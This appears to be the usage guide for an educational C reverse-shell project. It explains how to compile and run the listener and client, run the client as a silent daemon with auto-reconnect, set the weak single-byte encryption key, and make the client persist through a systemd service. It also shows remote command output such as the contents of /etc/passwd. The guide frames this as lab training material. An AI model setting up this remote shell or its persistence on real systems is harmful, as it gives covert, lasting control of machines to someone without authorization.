# Usage Guide

## Table of Contents
- [Quick Start](#quick-start)
- [Compilation](#compilation)
- [Running the Server](#running-the-server)
- [Running the Client](#running-the-client)
- [Configuration](#configuration)
- [Examples](#examples)
- [Troubleshooting](#troubleshooting)
- [Safety Guidelines](#safety-guidelines)

---

## Quick Start

### 1. Compile the Project

```bash
# Navigate to project directory
cd /path/to/ReverseShell-C

# Compile server
cd server
make
cd ..

# Compile client
cd client
make
cd ..
```

### 2. Start the Server

```bash
./server/server 4444
```

### 3. Start the Client (in another terminal)

```bash
./client/client 127.0.0.1 4444
```

### 4. Execute Commands

In the server terminal:
```
shell> whoami
shell> pwd
shell> ls -la
```

---

## Compilation

### Standard Build

**Server**:
```bash
cd server
make
```

**Client**:
```bash
cd client
make
```

### Debug Build

Includes debugging symbols and debug output:

```bash
cd server
make debug
```

```bash
cd client
make debug
```

### Release Build

Optimized for performance:

```bash
cd server
make release
```

```bash
cd client
make release
```

### Clean Build Artifacts

```bash
cd server
make clean
```

```bash
cd client
make clean
```

### Verify Compilation

```bash
# Check if binaries were created
ls -lh server/server
ls -lh client/client

# Check binary type
file server/server
file client/client
```

Expected output:
```
server/server: ELF 64-bit LSB executable, x86-64...
client/client: ELF 64-bit LSB executable, x86-64...
```

---

## Running the Server

### Basic Usage

```bash
./server/server [port]
```

### Examples

**Default port (4444)**:
```bash
./server/server
```

**Custom port**:
```bash
./server/server 8080
```

### Server Output

```
===========================================
  Educational Reverse Shell - Server
  For Authorized Lab Use Only
===========================================

[+] Server listening on port 4444
[*] Waiting for connections...
```

### When Client Connects

```
[+] Connection from 192.168.1.100:54321
[+] Client connected!
[*] Enter commands (type 'exit' to disconnect client):
shell> 
```

### Server Commands

- **Any shell command**: Executed on client machine
- **`exit`**: Disconnect current client (client will auto-reconnect)
- **Ctrl+C**: Terminate server

---

## Running the Client

### Basic Usage

```bash
./client/client <server_ip> [port] [-d]
```

### Parameters

- `<server_ip>`: IP address of server (required)
- `[port]`: Port number (optional, default: 4444)
- `[-d]`: Daemon mode flag (optional)

### Examples

#### Local Testing

```bash
./client/client 127.0.0.1 4444
```

#### Remote Server

```bash
./client/client 192.168.1.100 4444
```

#### Custom Port

```bash
./client/client 192.168.1.100 8080
```

#### Daemon Mode (Background)

```bash
./client/client 192.168.1.100 4444 -d
```

### Client Output

**Normal mode**:
```
===========================================
  Educational Reverse Shell - Client
  For Authorized Lab Use Only
===========================================

[*] Connecting to 192.168.1.100:4444
[*] Auto-reconnect enabled (delay: 5 seconds)
[*] Press Ctrl+C to stop
```

**Daemon mode**: No output (runs in background)

### Stopping the Client

**Normal mode**: Press `Ctrl+C`

**Daemon mode**:
```bash
# Find process ID
ps aux | grep client

# Kill process
kill <PID>
```

---

## Configuration

### Change Encryption Key

**File**: `common/crypto.h`

```c
#define ENCRYPTION_KEY 0xAA  // Change this value
```

**Example values**:
- `0xAA` (default, 170 in decimal)
- `0x5A` (90 in decimal)
- `0xFF` (255 in decimal)

**Important**: Both server and client must use the same key. Rebuild both after changing.

```bash
cd server && make clean && make
cd ../client && make clean && make
```

### Change Default Port

**Server**: `server/server.c`
```c
#define DEFAULT_PORT 4444  // Change this value
```

**Client**: `client/client.c`
```c
#define DEFAULT_PORT 4444  // Change this value
```

Or pass port as command-line argument (recommended).

### Change Reconnect Delay

**File**: `client/client.c`

```c
#define RETRY_DELAY 5  // Seconds between reconnection attempts
```

**Rebuild client**:
```bash
cd client && make clean && make
```

### Change Buffer Size

**File**: `common/crypto.h`

```c
#define BUFFER_SIZE 4096  // Bytes
```

**Rebuild both**:
```bash
cd server && make clean && make
cd ../client && make clean && make
```

---

## Examples

### Example 1: Basic Command Execution

**Server**:
```
shell> whoami
root
shell> pwd
/home/user
shell> uname -a
Linux debian 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
```

### Example 2: File Listing

**Server**:
```
shell> ls -la /tmp
total 12
drwxrwxrwt  3 root root 4096 Jan 31 10:00 .
drwxr-xr-x 18 root root 4096 Jan 15 08:30 ..
drwx------  2 user user 4096 Jan 31 09:45 systemd-private-abc123
```

### Example 3: Network Information

**Server**:
```
shell> ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255
        ...
```

### Example 4: Process Information

**Server**:
```
shell> ps aux | grep client
user      1234  0.0  0.1  12345  6789 ?        S    10:00   0:00 ./client
```

### Example 5: Multi-line Output

**Server**:
```
shell> cat /etc/passwd | head -5
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

### Example 6: Testing Reconnection

**Terminal 1 (Server)**:
```bash
./server/server 4444
# Wait for client to connect
# Press Ctrl+C to kill server
# Restart server
./server/server 4444
# Client should automatically reconnect
```

**Terminal 2 (Client)**:
```bash
./client/client 127.0.0.1 4444
# Client connects
# When server dies, client shows reconnection attempts
# When server restarts, client reconnects automatically
```

---

## Troubleshooting

### Issue: "Bind failed: Address already in use"

**Cause**: Port is already in use by another process.

**Solution**:
```bash
# Find process using port
sudo lsof -i :4444

# Kill process
sudo kill <PID>

# Or use different port
./server/server 8080
```

### Issue: "Connection refused"

**Cause**: Server is not running or firewall is blocking connection.

**Solution**:
1. Verify server is running:
   ```bash
   ps aux | grep server
   ```

2. Check firewall:
   ```bash
   sudo iptables -L
   ```

3. Allow port through firewall:
   ```bash
   sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT
   ```

### Issue: Client not reconnecting

**Cause**: Client may have crashed or been killed.

**Solution**:
1. Check if client is running:
   ```bash
   ps aux | grep client
   ```

2. Check client logs (if not in daemon mode)

3. Restart client

### Issue: Garbled output

**Cause**: Encryption key mismatch between client and server.

**Solution**:
1. Verify both use same `ENCRYPTION_KEY` in `common/crypto.h`
2. Rebuild both server and client
3. Restart both processes

### Issue: "Command executed (no output)"

**Cause**: Command produced no output or only stderr.

**Solution**:
- This is normal for commands like `cd`, `export`, etc.
- Try commands that produce output: `ls`, `pwd`, `whoami`

### Issue: Compilation errors

**Cause**: Missing dependencies or compiler issues.

**Solution**:
```bash
# Install build essentials
sudo apt-get update
sudo apt-get install build-essential

# Verify GCC is installed
gcc --version

# Clean and rebuild
make clean
make
```

---

## Safety Guidelines

### ⚠️ Legal and Ethical Use

**DO**:
- ✅ Use in your own lab environment
- ✅ Use with written authorization
- ✅ Use for educational purposes
- ✅ Use for authorized penetration testing
- ✅ Document your testing activities

**DON'T**:
- ❌ Use against systems without permission
- ❌ Use for malicious purposes
- ❌ Use in production environments
- ❌ Distribute to unauthorized parties
- ❌ Modify for malicious intent

### Lab Setup Recommendations

1. **Isolated Network**: Use VMs or isolated network segment
2. **Controlled Environment**: Lab machines only
3. **Documentation**: Keep logs of all testing
4. **Authorization**: Get written permission
5. **Cleanup**: Remove tools after testing

### Network Monitoring

Monitor traffic to verify encryption:

```bash
# Capture traffic on port 4444
sudo tcpdump -i any -n port 4444 -X

# Or use Wireshark
sudo wireshark
```

You should see encrypted (non-plaintext) data in the packet payload.

### Process Monitoring

Monitor client process:

```bash
# View running processes
ps aux | grep client

# Monitor system calls
strace -p <PID>

# Monitor network connections
sudo netstat -antp | grep client
```

---

## Advanced Usage

### Running Multiple Clients

**Server** (sequential handling):
```bash
./server/server 4444
# Handles one client at a time
# When client disconnects, ready for next client
```

**Clients**:
```bash
# Terminal 1
./client/client 192.168.1.100 4444

# Terminal 2 (will queue until Terminal 1 disconnects)
./client/client 192.168.1.100 4444
```

### Testing Encryption

**Verify encrypted traffic**:
```bash
# Terminal 1: Start server
./server/server 4444

# Terminal 2: Capture traffic
sudo tcpdump -i lo -n port 4444 -X -w capture.pcap

# Terminal 3: Start client
./client/client 127.0.0.1 4444

# Terminal 1: Send command
shell> whoami

# Terminal 2: Stop capture (Ctrl+C)
# Analyze capture.pcap - data should be encrypted
```

### Persistent Client Setup

**Create systemd service** (for educational persistence testing):

```bash
sudo nano /etc/systemd/system/reverse-client.service
```

```ini
[Unit]
Description=Educational Reverse Shell Client
After=network.target

[Service]
Type=simple
ExecStart=/path/to/client/client 192.168.1.100 4444 -d
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl start reverse-client
sudo systemctl status reverse-client
```

**Remember**: Remove this after testing!

---

## Conclusion

This usage guide covers all aspects of compiling, running, and configuring the Educational Reverse Shell system. Always use responsibly and only in authorized environments.

For architecture details, see [architecture.md](architecture.md).

**Questions or Issues?** Review the troubleshooting section or examine the source code comments.

---

**Remember**: Unauthorized access to computer systems is illegal. Use this tool ethically and responsibly.
